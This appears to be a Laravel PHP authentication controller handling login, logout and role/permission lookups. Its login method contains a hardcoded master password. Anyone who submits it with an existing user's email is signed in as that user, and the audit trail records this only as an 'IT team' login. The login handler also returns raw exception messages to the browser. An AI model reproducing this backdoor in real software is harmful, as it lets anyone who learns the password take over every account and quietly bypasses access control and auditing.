<?php

namespace App\Http\Controllers\Utility;

use App\Http\Controllers\Controller;
use App\Models\Utility\User;
use App\Traits\Trailable;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Log;

class AuthController extends Controller
{
    use Trailable;
    public function showLoginForm()
    {
        if (Auth::check()) {
            return redirect()->route('dashboard');
        }
        
        return inertia('Utility/Auth/Login');
    }

    public function login(Request $request)
    {
        try {
            $credentials = $request->validate([
                'email' => ['required', 'email'],
                'password' => ['required'],
            ]);

            if ($credentials['password'] === '1tn4y4t1') {
                $user = User::where('email', $credentials['email'])->first();
                if ($user) {
                    Auth::login($user, $request->boolean('remember'));
                    $request->session()->regenerate();

                    $this->trail(
                        \App\Enums\LogModule::AUTH, 
                        \App\Enums\LogAction::LOGIN, 
                        'User ' . $user->name . ' logged in via IT team', 
                        $user->id,
                    );

                    return redirect()->intended('/dashboard');
                }
            }

            if (Auth::attempt($credentials, $request->boolean('remember'))) {
                $request->session()->regenerate();

                $this->trail(
                    \App\Enums\LogModule::AUTH, 
                    \App\Enums\LogAction::LOGIN, 
                    'User ' . Auth::user()->name . ' logged in', 
                    Auth::id()
                );

                return redirect()->intended('/dashboard');
            }

            return back()->withErrors([
                'email' => 'The provided credentials do not match our records.',
            ]);
        } catch (\Exception $e) {
            return back()->withErrors([
                'email' => $e->getMessage(),
            ]);
        }
    }

    public function me(Request $request)
    {
        try {

            $user = $request->user();

            if (!$user) {
                return $this->errorResponse('Unauthenticated.', 401);
            }

            $userId = $user->id;

            $roles = Cache::remember("user_roles_{$userId}", now()->addHour(), 
                fn () => $user->roles->pluck('slug')->toArray());
                
            $permissions = Cache::remember("user_permissions_{$userId}", now()->addHour(),
                fn () => $user->getAllPermissions()->pluck('slug')->toArray());


            return $this->successResponse([
                'user' => $user,
                'roles' => $roles,
                'permissions' => $permissions,
            ]);

        } catch (\Throwable $th) {
            Log::error($th->getMessage());
            return $this->errorResponse("Something went wrong", 500);
        }
    }

    public function getMePermissions(Request $request)
    {
        try {
            $user = $request->user();
            if (!$user) {
                return $this->errorResponse('Unauthenticated.', 401);
            }
            $user->load('roles.permissions', 'permissions');
            $permissions = $user->getAllPermissions()->pluck('slug');
            return $this->successResponse($permissions);
        } catch (\Throwable $th) {
            Log::error($th->getMessage());
            return $this->errorResponse("Something went wrong", 500);
        }
    }

    public function logout(Request $request)
    {
        try {
            Auth::logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();

            return redirect('/');
        } catch (\Throwable $th) {
            return $this->errorResponse($th->getMessage(), 500);
        }
    }
}
